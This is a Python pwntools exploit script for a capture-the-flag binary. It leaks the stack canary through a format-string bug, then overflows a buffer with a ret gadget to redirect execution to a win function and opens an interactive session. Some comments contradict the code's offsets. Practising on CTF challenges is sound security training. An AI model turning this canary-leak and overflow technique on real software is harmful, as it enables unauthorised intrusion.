#!/usr/bin/env python3
from pwn import *

#context.log_level='debug'
elf = context.binary = ELF("./secret_library", checksec=False)


#259085703cb3f800 (changes at every run) <- %47$lx, canary position index = 47
#offset buf to canary = 72 <-- cyclic_find("saaataaa")A
#offset to rip = 72+8+8 


#ret_gadget= ROPgadget --binary ./space_station | grep "ret"


p = process(elf.path)
REMOTE_HOST,HOST_PORT= 'offsec.m0lecon.it', 13547

#p= remote(REMOTE_HOST,HOST_PORT)

# Your exploit here
OFFSET_TO_CANARY= 136 #offset from the first buffer to the canary
OFFSET_TO_RIP = OFFSET_TO_CANARY+8+8 #offset from the buffer to the RIP, OFFSET_TO_CANARY+8 (canary) + 8 (saved RBP) 
ret_gadget= 0x40101a
CANARY_IDX = 47


p.recvuntil(b"Sign the guestbook: ")
p.sendline(f"%{CANARY_IDX}$lx".encode())
line=p.recvline()
leak=line.strip().split()
log.info(f"leak line = {leak}")
#1) CANARY-->Leak the canary(of the vuln function) (the idea is to identify where the canary is located in order to copy it and insert it into the payload), the position (CANARY_IDX) was calculated expliting the format string method %19$p. We know that we "reach" the canary when the value retived have 00 as a final numbers.

leak_canary= leak[1]
canary = int(leak_canary, 16)

#

p.recvuntil(b"review: ")
payload = flat(
    b"A" * OFFSET_TO_CANARY,
     p64(canary),
    b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
    p64(ret_gadget),    # ret gadget for alignment
    p64(elf.sym.win),
)
p.send(payload)
#print(p.recvline())
p.interactive()



#>>> print("".join(f"%{i}$lx." for i in range(1, 10)))

